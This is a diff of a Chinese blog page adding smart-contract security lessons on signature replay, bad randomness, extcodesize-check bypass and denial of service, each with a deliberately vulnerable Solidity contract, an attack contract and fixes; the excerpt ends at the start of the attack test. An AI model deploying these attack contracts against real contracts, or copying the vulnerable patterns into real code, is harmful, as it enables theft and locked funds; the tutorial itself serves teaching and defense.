@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/web3/eth2.jpg">
 <meta property="article:published_time" content="2025-08-21T02:29:30.000Z">
-<meta property="article:modified_time" content="2025-08-21T09:24:34.780Z">
+<meta property="article:modified_time" content="2025-08-22T07:13:01.422Z">
 <meta property="article:author" content="Wangxiaowang">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/img/web3/eth2.jpg">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.5k 字
+          11k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          47 分钟
+          91 分钟
         
       </span>
     
@@ -483,6 +483,183 @@
 <li>Solidity <code>0.8.0</code> 之前的版本，在合约中引用 <a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.9/contracts/utils/math/SafeMath.sol">Safemath 库</a>，在整型溢出时报错。</li>
 <li>Solidity <code>0.8.0</code> 之后的版本内置了 <code>Safemath</code>，因此几乎不存在这类问题。开发者有时会为了节省gas使用 <code>unchecked</code> 关键字在代码块中临时关闭整型溢出检测，这时要确保不存在整型溢出漏洞。</li>
 </ol>
+<h1 id="S06-签名重放"><a href="#S06-签名重放" class="headerlink" title="S06. 签名重放"></a>S06. 签名重放</h1><p>上学的时候，老师经常会让家长签字，有时候家长很忙，我就会很“贴心”照着以前的签字抄一遍。某种意义上来说，这就是签名重放。</p>
+<p>数字签名一般有两种常见的重放攻击：</p>
+<ol>
+<li>普通重放：将本该使用一次的签名多次使用。NBA官方发布的《The Association》系列 NFT 因为这类攻击被免费铸造了上万枚。</li>
+<li>跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。做市商 Wintermute 因为跨链重放攻击被盗2000万枚 $OP。</li>
+</ol>
+<p><img src="/img/web3/S06-1.png" srcset="/img/loading.gif" lazyload alt="S06-1"></p>
+<h2 id="漏洞合约例子-4"><a href="#漏洞合约例子-4" class="headerlink" title="漏洞合约例子"></a>漏洞合约例子</h2><p>下面的<code>SigReplay</code>合约是一个<code>ERC20</code>代币合约，它的铸造函数有签名重放漏洞。它使用链下签名让白名单地址 <code>to</code> 铸造相应数量 <code>amount</code> 的代币。合约中保存了 <code>signer</code> 地址，来验证签名是否有效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;<br>import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;<br>import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;<br><br>// 权限管理错误例子<br>contract SigReplay is ERC20 &#123;<br><br>    address public signer;<br><br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123;<br>        signer = msg.sender;<br>    &#125;<br>    <br>    /**<br>     * 有签名重放漏洞的铸造函数<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 签名： 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b<br>     */<br>    function badMint(address to, uint amount, bytes memory signature) public &#123;<br>        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>        require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>        _mint(to, amount);<br>    &#125;<br><br>    /**<br>     * 将to地址（address类型）和amount（uint256类型）拼成消息msgHash<br>     * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4<br>     * amount: 1000<br>     * 对应的消息msgHash: 0xb4a4ba10fbd6886a312ec31c54137f5714ddc0e93274da8746a36d2fa96768be<br>     */<br>    function getMessageHash(address to, uint256 amount) public pure returns(bytes32)&#123;<br>        return keccak256(abi.encodePacked(to, amount));<br>    &#125;<br><br>    /**<br>     * @dev 获得以太坊签名消息<br>     * `hash`：消息哈希 <br>     * 遵从以太坊签名标准：https://eth.wiki/json-rpc/API#eth_sign[`eth_sign`]<br>     * 以及`EIP191`:https://eips.ethereum.org/EIPS/eip-191`<br>     * 添加&quot;\x19Ethereum Signed Message:\n32&quot;字段，防止签名的是可执行交易。<br>     */<br>    function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) &#123;<br>        // 32 is the length in bytes of hash,<br>        // enforced by the type signature above<br>        return keccak256(abi.encodePacked(&quot;\x19Ethereum Signed Message:\n32&quot;, hash));<br>    &#125;<br><br>    // ECDSA验证<br>    function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool)&#123;<br>        return ECDSA.recover(_msgHash, _signature) == signer;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>注意</strong> 铸造函数 <code>badMint()</code> 没有对 <code>signature</code> 查重，导致同样的签名可以多次使用，无限铸造代币。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function badMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="预防办法-2"><a href="#预防办法-2" class="headerlink" title="预防办法"></a>预防办法</h2><p>签名重放攻击主要有两种预防办法：</p>
+<ol>
+<li><p>将使用过的签名记录下来，比如记录下已经铸造代币的地址 <code>mintedAddress</code>，防止签名反复使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">mapping(address =&gt; bool) public mintedAddress;   // 记录已经mint的地址<br><br>function goodMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    // 检查该地址是否mint过<br>    require(!mintedAddress[to], &quot;Already minted&quot;);<br>    // 记录mint过的地址<br>    mintedAddress[to] = true;<br>    _mint(to, amount);<br>&#125;<br>```solidity<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>将 <code>nonce</code> （数值随每次交易递增）和 <code>chainid</code> （链ID）包含在签名消息中，这样可以防止普通重放和跨链重放攻击：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint nonce;<br><br>function nonceMint(address to, uint amount, bytes memory signature) public &#123;<br>    bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));<br>    require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;);<br>    _mint(to, amount);<br>    nonce++;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+</li>
+<li><p>对于由用户输入<code>signature</code>的场景，需要检验<code>signature</code>的长度，确保其长度为<code>65bytes</code>，否则也会产生签名重放问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function mint(address to, uint amount, bytes memory signature) public &#123;<br>    require(signature.length == 65, &quot;Invalid signature length&quot;);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>一、签名重放攻击概念</p>
+<p>1.定义</p>
+<ul>
+<li>攻击者截获有效签名</li>
+<li>多次重复使用同一签名</li>
+<li>非法执行授权操作</li>
+</ul>
+<p>2.典型攻击场景</p>
+<ul>
+<li>转账授权</li>
+<li>特权操作</li>
+<li>资产交易</li>
+<li>权限验证</li>
+</ul>
+<p>四、最佳实践</p>
+<p>1.始终使用Nonce<br>2.添加过期时间<br>3.使用域分隔符<br>4.限制签名使用次数<br>5.严格验证签名参数</p>
+<p>五、常见错误</p>
+<p>1.重用Nonce<br>2.没有过期机制<br>3.签名验证不严格<br>4.未限制签名范围</p>
+<p>六、推荐库</p>
+<p>1.OpenZeppelin</p>
+<ul>
+<li>提供安全签名工具</li>
+<li>标准化实现</li>
+</ul>
+<p>2.EIP-712实现</p>
+<ul>
+<li>安全的签名标准</li>
+<li>跨链兼容</li>
+</ul>
+<h1 id="S07-坏随机数"><a href="#S07-坏随机数" class="headerlink" title="S07. 坏随机数"></a>S07. 坏随机数</h1><p>智能合约的坏随机数（Bad Randomness）漏洞和预防方法，这个漏洞经常在 NFT 和 GameFi 中出现，包括 Meebits，Loots，Wolf Game等。</p>
+<h2 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h2><p>很多以太坊上的应用都需要用到随机数，例如<code>NFT</code>随机抽取<code>tokenId</code>、抽盲盒、<code>gamefi</code>战斗中随机分胜负等等。但是由于以太坊上所有数据都是公开透明（<code>public</code>）且确定性（<code>deterministic</code>）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如<code>random()</code>。很多项目方不得不使用链上的伪随机数生成方法，例如 <code>blockhash()</code> 和 <code>keccak256()</code> 方法。</p>
+<p>坏随机数漏洞：攻击者可以事先计算这些伪随机数的结果，从而达到他们想要的目的，例如铸造任何他们想要的稀有<code>NFT</code>而非随机抽取。更多的内容可以阅读 <a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/39_Random">WTF Solidity极简教程 第39讲：伪随机数</a>。</p>
+<h2 id="坏随机数案例"><a href="#坏随机数案例" class="headerlink" title="坏随机数案例"></a>坏随机数案例</h2><p>下面我们学习一个有坏随机数漏洞的 NFT 合约： BadRandomness.sol。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract BadRandomness is ERC721 &#123;<br>    uint256 totalSupply;<br><br>    // 构造函数，初始化NFT合集的名称、代号<br>    constructor() ERC721(&quot;&quot;, &quot;&quot;)&#123;&#125;<br><br>    // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint<br>    function luckyMint(uint256 luckyNumber) external &#123;<br>        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number<br>        require(randomNumber == luckyNumber, &quot;Better luck next time!&quot;);<br><br>        _mint(msg.sender, totalSupply); // mint<br>        totalSupply++;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>它有一个主要的铸造函数 <code>luckyMint()</code>，用户调用时输入一个 <code>0-99</code> 的数字，如果和链上生成的伪随机数 <code>randomNumber</code> 相等，即可铸造幸运 NFT。伪随机数使用 <code>blockhash</code> 和 <code>block.timestamp</code> 声称。这个漏洞在于用户可以完美预测生成的随机数并铸造NFT。</p>
+<p>下面我们写个攻击合约 <code>Attack.sol</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    function attackMint(BadRandomness nftAddr) external &#123;<br>        // 提前计算随机数<br>        uint256 luckyNumber = uint256(<br>            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))<br>        ) % 100;<br>        // 利用 luckyNumber 攻击<br>        nftAddr.luckyMint(luckyNumber);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>攻击函数 <code>attackMint()</code>中的参数为 <code>BadRandomness</code>合约地址。在其中，我们计算了随机数 <code>luckyNumber</code>，然后将它作为参数输入到 <code>luckyMint()</code> 函数完成攻击。由于<code>attackMint()</code>和<code>luckyMint()</code>将在同一个区块中调用，<code>blockhash</code>和<code>block.timestamp</code>是相同的，利用他们生成的随机数也相同。</p>
+<h1 id="S08-绕过合约长度检查"><a href="#S08-绕过合约长度检查" class="headerlink" title="S08. 绕过合约长度检查"></a>S08. 绕过合约长度检查</h1><p>有一些项目为了限制程序员，会用到isContract()方法来校验msg.sender限制为外部账户(EOA)，而非合约地址</p>
+<p>这个函数利用的是<code>extcodesize</code>获取改地址所存储的bytecode长度(runtime)，如果大于0，这判断为合约，否则就是EOA（用户）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用 extcodesize 检查是否为合约<br>function isContract(address account) public view returns (bool) &#123;<br>    // extcodesize &gt; 0 的地址一定是合约地址<br>    // 但是合约在构造函数时候 extcodesize 为0<br>    uint size;<br>    assembly &#123;<br>        size := extcodesize(account)<br>    &#125;<br>    return size &gt; 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里有一个漏洞，就是在合约在被创建的时候，<code>runtime bytecode</code> 还没有被存储到地址上，因此 <code>bytecode</code> 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 <code>constructor</code> 中的话，就可以绕过 <code>isContract()</code> 检查。</p>
+<p><img src="/img/web3/S08-1.png" srcset="/img/loading.gif" lazyload alt="S08-1"></p>
+<h2 id="漏洞例子"><a href="#漏洞例子" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们来看一个例子：<code>ContractCheck</code>合约是一个 freemint ERC20 合约，铸造函数 <code>mint()</code> 中使用了 <code>isContract()</code> 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 <code>mint()</code> 可以铸造 100 枚代币。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 用extcodesize检查是否为合约地址<br>contract ContractCheck is ERC20 &#123;<br>    // 构造函数：初始化代币名称和代号<br>    constructor() ERC20(&quot;&quot;, &quot;&quot;) &#123;&#125;<br>    <br>    // 利用 extcodesize 检查是否为合约<br>    function isContract(address account) public view returns (bool) &#123;<br>        // extcodesize &gt; 0 的地址一定是合约地址<br>        // 但是合约在构造函数时候 extcodesize 为0<br>        uint size;<br>        assembly &#123;<br>            size := extcodesize(account)<br>        &#125;<br>        return size &gt; 0;<br>    &#125;<br><br>    // mint函数，只有非合约地址能调用（有漏洞）<br>    function mint() public &#123;<br>        require(!isContract(msg.sender), &quot;Contract not allowed!&quot;);<br>        _mint(msg.sender, 100);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>我们写一个攻击合约，在 <code>constructor</code> 中多次调用 <code>ContractCheck</code> 合约中的 <code>mint()</code> 函数，批量铸造 <code>1000</code> 枚代币：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 利用构造函数的特点攻击<br>contract NotContract &#123;<br>    bool public isContract;<br>    address public contractCheck;<br><br>    // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。<br>    constructor(address addr) &#123;<br>        contractCheck = addr;<br>        isContract = ContractCheck(addr).isContract(address(this));<br>        // This will work<br>        for(uint i; i &lt; 10; i++)&#123;<br>            ContractCheck(addr).mint();<br>        &#125;<br>    &#125;<br><br>    // 合约创建好以后，extcodesize &gt; 0，isContract() 可以检测<br>    function mint() external &#123;<br>        ContractCheck(contractCheck).mint();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>如果我们之前讲的是正确的话，在构造函数调用 <code>mint()</code> 可以绕过 <code>isContract()</code> 的检查成功铸造代币，那么函数将成功部署，并且状态变量 <code>isContract</code> 会在构造函数赋值 <code>false</code>。而在合约部署之后，<code>runtime bytecode</code> 已经被存储在合约地址上了，<code>extcodesize &gt; 0</code>， <code>isContract()</code> 能够成功阻止铸造，调用 <code>mint()</code> 函数将失败。</p>
+<h2 id="预防办法-3"><a href="#预防办法-3" class="headerlink" title="预防办法"></a>预防办法</h2><p>你可以使用 <code>(tx.origin == msg.sender)</code> 来检测调用者是否为合约。如果调用者为 EOA，那么<code>tx.origin</code>和<code>msg.sender</code>相等；如果它们俩不相等，调用者为合约。在<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-3074">eip-3074</a>中，这样检查合约的方式，会失效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function realContract(address account) public view returns (bool) &#123;<br>    return (tx.origin == msg.sender);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>这一讲，我们介绍了合约长度检查可以被绕过的漏洞，并介绍预防的方法。如果一个地址的 <code>extcodesize &gt; 0</code>，则该地址一定为合约；但如果 <code>extcodesize = 0</code>，该地址既可能为 <code>EOA</code>，也可能为正在创建状态的合约。</p>
+<h1 id="S09-拒绝服务"><a href="#S09-拒绝服务" class="headerlink" title="S09. 拒绝服务"></a>S09. 拒绝服务</h1><p>在 Web2 中，拒绝服务攻击（DoS）是指通过向服务器发送大量垃圾信息或干扰信息的方式，导致服务器无法向正常用户提供服务的现象。而在 Web3，它指的是利用漏洞使得智能合约无法正常提供服务。</p>
+<p>在 2022 年 4 月，一个很火的 NFT 项目名为 Akutar，他们使用<a target="_blank" rel="noopener" href="https://github.com/AmazingAng/WTF-Solidity/tree/main/35_DutchAuction">荷兰拍卖</a>进行公开发行，筹集了 11,539.5 ETH，非常成功。之前持有他们社区 Pass 的参与者会得到 0.5 ETH 的退款，但是他们处理退款的时候，发现智能合约不能正常运行，全部资金被永远锁在了合约里。他们的智能合约有拒绝服务漏洞。</p>
+<p><img src="/img/web3/S09-1.png" srcset="/img/loading.gif" lazyload alt="S09-1"></p>
+<h2 id="漏洞例子-1"><a href="#漏洞例子-1" class="headerlink" title="漏洞例子"></a>漏洞例子</h2><p>下面我们学习一个简化了的 Akutar 合约，名字叫 <code>DoSGame</code>。这个合约逻辑很简单，游戏开始时，玩家们调用 <code>deposit()</code> 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，<code>refund()</code>函数被调用，将 ETH 依次退款给所有玩家。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.21;<br><br>// 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。<br>contract DoSGame &#123;<br>    bool public refundFinished;<br>    mapping(address =&gt; uint256) public balanceOf;<br>    address[] public players;<br><br>    // 所有玩家存ETH到合约里<br>    function deposit() external payable &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        require(msg.value &gt; 0, &quot;Please donate ETH&quot;);<br>        // 记录存款<br>        balanceOf[msg.sender] = msg.value;<br>        // 记录玩家地址<br>        players.push(msg.sender);<br>    &#125;<br><br>    // 游戏结束，退款开始，所有玩家将依次收到退款<br>    function refund() external &#123;<br>        require(!refundFinished, &quot;Game Over&quot;);<br>        uint256 pLength = players.length;<br>        // 通过循环给所有玩家退款<br>        for(uint256 i; i &lt; pLength; i++)&#123;<br>            address player = players[i];<br>            uint256 refundETH = balanceOf[player];<br>            (bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br>            require(success, &quot;Refund Fail!&quot;);<br>            balanceOf[player] = 0;<br>        &#125;<br>        refundFinished = true;<br>    &#125;<br><br>    function balance() external view returns(uint256)&#123;<br>        return address(this).balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>这里的漏洞在于，<code>refund()</code> 函数中利用循环退款的时候，是使用的 <code>call</code> 函数，将激活目标地址的回调函数，如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">(bool success, ) = player.call&#123;value: refundETH&#125;(&quot;&quot;);<br></code></pre></td></tr></table></figure>
+
+
+
+<p>下面我们写个攻击合约， <code>attack()</code> 函数中将调用 <code>DoSGame</code> 合约的 <code>deposit()</code> 存款并参与游戏；<code>fallback()</code> 回调函数将回退所有向该合约发送<code>ETH</code>的交易，对<code>DoSGame</code> 合约中的 DoS 漏洞进行了攻击，所有退款将不能正常进行，资金被锁在合约中，就像 Akutar 合约中的一万多枚 ETH 一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Attack &#123;<br>    // 退款时进行DoS攻击<br>    fallback() external payable&#123;<br>        revert(&quot;DoS Attack!&quot;);<br>    &#125;<br><br>    // 参与DoS游戏并存款<br>    function attack(address gameAddr) external payable &#123;<br>        DoSGame dos = DoSGame(gameAddr);<br>        dos.deposit&#123;value: msg.value&#125;();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>测试场景一：正常使用是否可以成功退款</p>
+<p>测试代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract DoSGameAttackTest is Test &#123;<br>    DoSGame public doSGame;<br>    DoSGameAttack public doSGameAttack;<br>    address public user;<br>    function setUp() public &#123;<br>        doSGame = new DoSGame(); // 部署 DoSGame 合约<br>        // 创建测试用户<br>        user = makeAddr(&quot;testUser&quot;);<br>        // 给用户转账<br>        vm.deal(user, 10 * 1e18);<br>    &#125;<br>    function test_deposit() public &#123;<br>        vm.startPrank(user);<br>        uint256 Before = doSGame.balance();<br>        console.log(&quot;doSGame.balance Before is  &quot;, Before);<br>        doSGame.deposit&#123;value: 3 * 1e18&#125;();// 往 bank充值3颗ETH<br>        uint256 After = doSGame.balance();<br>        console.log(&quot;doSGame.balance After is  &quot;, After);<br>        doSGame.refund(); // 成功退款<br>        uint256 End = doSGame.balance();<br>        console.log(&quot;doSGame.balance End is  &quot;, End);<br>        vm.stopPrank();<br>    &#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>正常场景的测试结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs shell">Logs:<br>  doSGame.balance Before is   0<br>  doSGame.balance After is   3000000000000000000<br>  doSGame.balance End is   0<br><br>Traces:<br>  [123843] DoSGameAttackTest::test_deposit()<br>    ├─ [0] VM::startPrank(testUser: [0xF7DFAA7B4230fdc795e8C6430834Cf309aF893bA])<br>    │   └─ ← [Return]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance Before is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [68935] DoSGame::deposit&#123;value: 3000000000000000000&#125;()<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 3000000000000000000 [3e18]<br>    ├─ [0] console::log(&quot;doSGame.balance After is  &quot;, 3000000000000000000 [3e18]) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [28477] DoSGame::refund()<br>    │   ├─ [0] testUser::fallback&#123;value: 3000000000000000000&#125;()<br>    │   │   └─ ← [Stop]<br>    │   └─ ← [Stop]<br>    ├─ [378] DoSGame::balance() [staticcall]<br>    │   └─ ← [Return] 0<br>    ├─ [0] console::log(&quot;doSGame.balance End is  &quot;, 0) [staticcall]<br>    │   └─ ← [Stop]<br>    ├─ [0] VM::stopPrank()<br>    │   └─ ← [Return]<br>    └─ ← [Stop]<br><br></code></pre></td></tr></table></figure>
+
+<p>测试场景二：攻击合约测试</p>
